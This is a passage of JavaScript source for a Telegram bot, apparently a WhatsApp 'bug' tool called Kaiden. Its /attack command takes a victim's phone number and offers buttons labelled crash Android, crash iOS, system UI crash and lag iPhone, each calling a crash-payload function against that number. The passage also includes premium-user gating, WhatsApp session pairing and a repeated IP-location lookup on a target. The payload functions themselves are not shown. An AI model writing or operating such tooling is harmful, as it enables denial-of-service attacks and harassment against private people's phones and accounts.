                   for (let i = 0; i < 10; i++) {
                           await IpLocation(target)
                   }
                   for (let i = 0; i < 2; i++) {
                           await IpLocation(target)
                   }
           }
           bot.onText(/\/start(?:\s(.+))?/, async (msg, match) => {
                   const senderId = msg.from.id;
                   const chatId = msg.chat.id;
                   const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
                   let ligma = `
▢ 👋🏻 Hi I am kaiden, I was created please select the bug menu below by @Yagami4you - @pxbian.

╭╮╭━╮╱╱╱╱╱╭╮╱╱╱╱╱╱
┃┃┃╭╯╱╱╱╱╱┃┃╱╱╱╱╱╱
┃╰╯╯╭━━┳┳━╯┣━━┳━━╮
┃╭╮┃┃╭╮┣┫╭╮┃┃━┫╭╮┃
┃┃┃╰┫╭╮┃┃╰╯┃┃━┫┃┃┃
╰╯╰━┻╯╰┻┻━━┻━━┻╯╰╯
𖤍 𝚂𝚝𝚊𝚝𝚞𝚜 : 𝙾𝚗𝚕𝚒𝚗𝚎
𖤍 𝚃𝚒𝚖𝚎 : ${greeting}
𖤍 𝚁𝚞𝚗 𝚃𝚒𝚖𝚎 : -`
                   const options = {
                           reply_markup: {
                                   inline_keyboard: [
                                           [{
                                                   text: "☬ 𝐊𝐚𝐢𝐝𝐞𝐧 𝐀𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮🐉",
                                                   callback_data: `xbug`
                                           }],
                                           [{
                                                   text: "S̵̙͕̀̃U̠҉̷̙ͦP̧͕̒̊͘P̧͕̒̊͘O̖̼ͩ͌͐R͉̜̎͡͠T̨͈͗̌ͥ͐ 🌟",
                                                   callback_data: `tqto`
                                           }, {
                                                   text: "A̷͙ͭͫ̕K͕͓͌̎̾S̵̙͕̀̃Ḛͭ̉̇͟S̵̙͕̀̃ 🌟",
                                                   callback_data: `akses`
                                           }],
                                           [{
                                                   text: " M͉̅ͮ͒ͤḚͭ̉̇͟N̺̻̔̆ͅU̠҉̷̙ͦ🧞‍♂️",
                                                   callback_data: `xbug`
                                           }],
                                           [{
                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                   url: "https://www.youtube.com/@aidilaseptia"
                                           }, {
                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                           }],
                                           [{
                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                   url: "https://t.me/Yagami4you"
                                           }]
                                   ]
                           }
                   };
                   bot.sendPhoto(chatId, "https://d.top4top.io/p_3370w36ff1.jpg", {
                           caption: ligma,
                           ...options,
                   });
           });
           const authorizedUsers = {};
           bot.onText(/\/attack(?:\s(.+))?/, async (msg, match) => {
                   const senderId = msg.from.id;
                   const chatId = msg.chat.id;
                   if (!whatsappStatus) {
                           return bot.sendMessage(chatId, "[ ! ] ɴᴏᴛ ᴄᴏɴɴᴇᴛ ғᴏʀ ᴡʜᴀᴛsᴀᴘᴘ 🐉");
                   }
                   if (!premiumUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] - ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[ ! ] - ᴇxᴀᴍᴘʟᴇ : /ᴀᴛᴛᴀᴄᴋ 62xxx - [ ʜᴜʀᴜғ ᴡᴀᴊɪʙ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ] 🐉");
                   }
                   const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
                   if (!/^\d+$/.test(numberTarget)) {
                           return bot.sendMessage(chatId, "[ ! ] - ɪɴᴘᴜᴛ ɴᴜᴍʙᴇʀ ᴛᴀʀɢᴇᴛ 🐉");
                   }
                   const finalFormattedNumber = `${numberTarget}@s.whatsapp.net`;
                   const VirusName = {
                           "superior" : "𝐓𝐑𝐀𝐒𝐇 𝐅𝐋𝐎𝐀𝐓𝐈𝐍𝐆 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍 𖥂",
                           "paytroll" : "𝐓𝐑𝐎𝐋𝐋 𝐒𝐔𝐏𝐄𝐑𝐈𝐎𝐑 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍 𖥂",
                           "payment" : "𝐑𝐄𝐐 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𖥂",
                           "andro" : "𝐂𝐑𝐀𝐒𝐇 𝐀𝐍𝐃𝐑𝐎 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍 𖥂",
                           "iphonex" : "𝐂𝐀𝐋𝐋 𝐈𝐎𝐒 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍 𖥂",
                           "traship" : "𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍 𖥂",
                           "crashui" : "𝐒𝐘𝐒𝐓𝐄𝐌 𝐔𝐈 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍 𖥂",
                           "crashuitwo" : "𝐒𝐘𝐒𝐓𝐄𝐌 𝐂𝐑𝐀𝐒𝐇 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍 𖥂",
                           "lagiphone" : "𝐋𝐀𝐆 𝐈𝐏𝐇𝐎𝐍𝐄 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍𖥂",
                           "xiphone" : "𝐊𝐈𝐋𝐋 𝐈𝐏𝐇𝐎𝐍𝐄 𝐁𝐘 𝐊𝐀𝐈𝐃𝐄𝐍𖥂"
                           
                   }
                   authorizedUsers[chatId] = senderId;
                   const options = {
                           reply_markup: {
                                   inline_keyboard: [
                                           [{
                                                   text: "S̵̙͕̀̃U̠҉̷̙ͦP̧͕̒̊͘Ḛͭ̉̇͟R͉̜̎͡͠ C̵͉͋̔͞R͉̜̎͡͠A̷͙ͭͫ̕S̵̙͕̀̃Hͥ̽ͣ̃̔",
                                                   callback_data: `superior:${finalFormattedNumber}`
                                           }, {
                                                   text: "I̍̅̀̎̊N̺̻̔̆ͅV̘̪͆̂̅I̍̅̀̎̊S̵̙͕̀̃I̍̅̀̎̊B̩͎͍̾ͅL̸̖̽̌͂Ḛͭ̉̇͟",
                                                   callback_data: `paytroll:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "Hͥ̽ͣ̃̔A̷͙ͭͫ̕R͉̜̎͡͠D̶͔̭̪̻ U̠҉̷̙ͦI̍̅̀̎̊",
                                                   callback_data: `payment:${finalFormattedNumber}`
                                           }, {
                                                   text: "N̺̻̔̆ͅḚͭ̉̇͟U̠҉̷̙ͦV̘̪͆̂̅O̖̼ͩ͌͐K͕͓͌̎̾A̷͙ͭͫ̕I̍̅̀̎̊D̶͔̭̪̻Ḛͭ̉̇͟N̺̻̔̆ͅ",
                                                   callback_data: `andro:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "C̵͉͋̔͞R͉̜̎͡͠A̷͙ͭͫ̕S̵̙͕̀̃Hͥ̽ͣ̃̔ I̍̅̀̎̊P̧͕̒̊͘Hͥ̽ͣ̃̔O̖̼ͩ͌͐N̺̻̔̆ͅḚͭ̉̇͟ K͕͓͌̎̾A̷͙ͭͫ̕I̍̅̀̎̊D̶͔̭̪̻Ḛͭ̉̇͟N̺̻̔̆ͅ",
                                                   callback_data: `iphonex:${finalFormattedNumber}`
                                           }, {
                                                   text: "C̵͉͋̔͞R͉̜̎͡͠A̷͙ͭͫ̕S̵̙͕̀̃Hͥ̽ͣ̃ U̠҉̷̙ͦI̍̅̀̎̊ V̘̪͆̂̅1̨̹̦͍̀",
                                                   callback_data: `traship:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "C̵͉͋̔͞R͉̜̎͡͠A̷͙ͭͫ̕S̵̙͕̀̃Hͥ̽ͣ̃̔ U̠҉̷̙ͦI̍̅̀̎̊̍̅̀̎ V̘̪͆̂̅2̷́̃̉̕",
                                                   callback_data: `crashui:${finalFormattedNumber}`
                                           }, {
                                                   text: "Hͥ̽ͣ̃̔A̷͙ͭͫ̕R͉̜̎͡͠D̶͔̭̪̻ U̠҉̷̙ͦI̍̅̀̎v͒̄ͭ̏̇2̷́̃̉̕",
                                                   callback_data: `crashuitwo:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "D̶͔̭̪̻Ḛͭ̉̇͟L̸̖̽̌͂A̷͙ͭͫ̕Ỵ̛̖͋͢ M͉̅ͮ͒ͤA̷͙ͭͫ̕K͕͓͌̎̾Ḛͭ̉̇͟R͉̜̎͡͠",
                                                   callback_data: `lagiphone:${finalFormattedNumber}`
                                           }, {
                                                   text: "I̍̅̀̎̊N̺̻̔̆ͅV̘̪͆̂̅I̍̅̀̎̊S̵̙͕̀̃I̍̅̀̎̊B̩͎͍̾ͅL̸̖̽̌͂Ḛͭ̉̇͟",
                                                   callback_data: `xiphone:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                   url: "https://www.youtube.com/@aidilaseptia"
                                           }, {
                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                           }],
                                           [{
                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                   url: "https://t.me/Yagami4you"
                                           }]
                                   ]
                           }
                   };
                   bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                           caption: "☬ 𝐊𝐚𝐢𝐝𝐞𝐧 𝐀𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮🐉",
                           ...options,
                   });
           });
           bot.onText(/\/addpairing(?:\s(.+))?/, async (msg, match) => {
                   const senderId = msg.from.id;
                   const chatId = msg.chat.id;
                   if (!premiumUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] - ᴏɴʟʏ ᴏᴡɴᴇʀ 🐉")
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "ᴇxᴀᴍᴘʟᴇ : /addpairing 62XXX");
                   }
                   const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
                   if (!/^\d+$/.test(numberTarget)) {
                           return bot.sendMessage(chatId, "! ɪɴᴠᴀʟɪᴅ - ᴇxᴀᴍᴘʟᴇ : addpairing 62XXX");
                   }
                   await getSessions(bot, chatId, numberTarget)
           });
           bot.on("callback_query", async (callbackQuery) => {
                   const chatId = callbackQuery.message.chat.id;
                   const senderId = callbackQuery.from.id;
                   const userId = callbackQuery.from.id;
                   const [action, finalFormattedNumber] = callbackQuery.data.split(':');
                   if (!premiumUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] - ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ");
                   }
                   if (action !== "akses" && action !== "tqto" && action !== "xbug") {
                   const numberTarget = callbackQuery.data.match(/(\d+)/);
                   if (!numberTarget) {
                           return bot.sendMessage(chatId, "[ ! ] - ɪɴᴘᴜᴛ ɴᴜᴍʙᴇʀ ᴛᴀʀɢᴇᴛ 🐉");
                   }
                   if (authorizedUsers[chatId] !== userId) {
                   return bot.answerCallbackQuery(callbackQuery.id, {
                           text: "👋🏻 ᴘʟᴇᴀsᴇ ǫᴜᴇᴜᴇ ғᴏʀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ ʙᴜɢ ɴᴇxᴛ ᴍɪɴɪᴍ 5 ᴍɪɴᴜᴛᴇs",
                           show_alert: true,
                        });
                   }
                   const finalFormattedNumber = `${numberTarget[1]}@s.whatsapp.net`;
                   }
                   try {
                           if (action === "superior") {
                                   await callxbutton(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘 🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "paytroll") {
                                   await callxbutton(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘 🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "payment") {
                                   await callxbutton(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘 🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "andro") {
                                   await callxbutton(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "iphonex") {
                                   await invisiphone(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://d.top4top.io/p_3370w36ff1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "traship") {
                                   await invisiphone(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://d.top4top.io/p_3370w36ff1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "crashui") {
                                   await crashuixcursor(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://d.top4top.io/p_3370w36ff1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "crashuitwo") {
                                   await crashuixcursor(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://d.top4top.io/p_3370w36ff1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "lagiphone") {
                                   await laghomeiphone(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://d.top4top.io/p_3370w36ff1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "xiphone") {
                                   await laghomeiphone(finalFormattedNumber);
                                   bot.sendPhoto(chatId, "https://d.top4top.io/p_3370w36ff1.jpg", {
                                           caption: `<🝰 ᯭ𝐒𝐔𝐂𝐂𝐄𝐒 𝐅𝐔𝐋𝐋𝐘🐉\n\n☬ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n☬ ᴄʜᴀᴛ ᴀᴊᴀ ʙᴀɴɢ ᴜᴅᴀʜ ᴋᴇ sᴇɴᴅ ʙᴜɢ ɴʏᴀ ᴛᴜʜ 👹`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "tqto") {
                                   let ligma = `
╔─═「 T̨͈͗̌ͥHͥ̽ͣ̃̔A̷͙ͭͫ̕N̺̻̔̆ͅK͕͓͌̎̾S̵̙͕̀̃ T̨͈͗̌ͥO̖̼ͩ͌͐ 」
│┏─⊱
║▢ 𝑲𝒂𝒊𝒅𝒆𝒏 𝑨𝒎𝒂𝒕𝒆𝒓𝒂𝒔𝒖
│▢ 𝒀𝒂𝒈𝒂𝒎𝒊
║▢ 𝑳𝒆𝑿𝒄𝒛
│▢ 𝑷𝒊𝒌𝒓𝒊
║▢ 𝑨𝒛𝒌𝒂
│▢ 𝑨𝒍𝒍 𝙥𝙚𝙣𝙜𝙜𝙪𝙣𝙖 -
║┗─⊱
╚─═─═─═─═─═─═─═⪩`;
                                   bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                                           caption: ligma,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "akses") {
                                   let ligma = `
╔─═「 A̷͙ͭͫ̕K͕͓͌̎̾S̵̙͕̀̃Ḛͭ̉̇͟S̵̙͕̀̃ 」
│┏─⊱
║▢ /addpairing ‹number›
│▢ /addadmin ‹id›
║▢ /addprem ‹id›
║▢ /delladmin ‹id›
│▢ /dellprem ‹id›
║┗─⊱
╚─═─═─═─═─═─═─⪩`;
                                   bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                                           caption: ligma,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "xbug") {
                                   let ligma = `
☬ 𝐊𝐚𝐢𝐝𝐞𝐧 𝐀𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮🐉

╔─═「 卂ㄒㄒ卂匚Ҝ 」
│┏─⊱
║▢ /attack ‹target›
│┗─⊱
╚─═─═─═─═─═─═⪩`;
                                   bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                                           caption: ligma,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else {
                                   if (!finalFormattedNumber) {
                                           return bot.sendMessage(chatId, "☬ ɪɴᴠᴀʟɪᴅ ᴅᴀᴛᴀ ᴄᴀʟʟ ʙᴀᴄᴋ");
                                   }
                                   bot.sendMessage(chatId, "[ ! ] - ᴀᴄᴛɪᴏɴ ɴᴏᴛ ғᴏᴜɴᴅ");
                           }
                   } catch (err) {
                           bot.sendMessage(chatId, `[ ! ] - ғᴀɪʟᴇᴅ sᴇɴᴅ ʙᴜɢ : ${err.message}`);
                   }
           });
           bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   if (!premiumUsers.includes(senderId) && !adminUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] ɴᴏᴛ ᴀᴅᴅ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ ᴀɴᴏᴍᴀʟɪ");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[ ! ] ᴇxᴀᴍᴘʟᴇ ᴀᴅᴅᴘʀᴇᴍ ɪᴅ");
                   }
                   const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
                   if (!/^\d+$/.test(userId)) {
                           return bot.sendMessage(chatId, "𝚂𝙴𝚁𝚃𝙰𝙺𝙰𝙽 𝙸𝙳 𝚃𝙴𝙻𝙴");
                   }
                   if (!premiumUsers.includes(userId)) {
                           premiumUsers.push(userId);
                           savePremiumUsers();
                           bot.sendPhoto(chatId, "https://c.top4top.io/p_3370ccxo01.jpg", {
                                   caption: `☬ 𝙎𝙐𝘾𝘾𝙀𝙎 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉 𝙐𝙎𝙀𝙍 🐉`,
                                   reply_markup: {
                                           inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
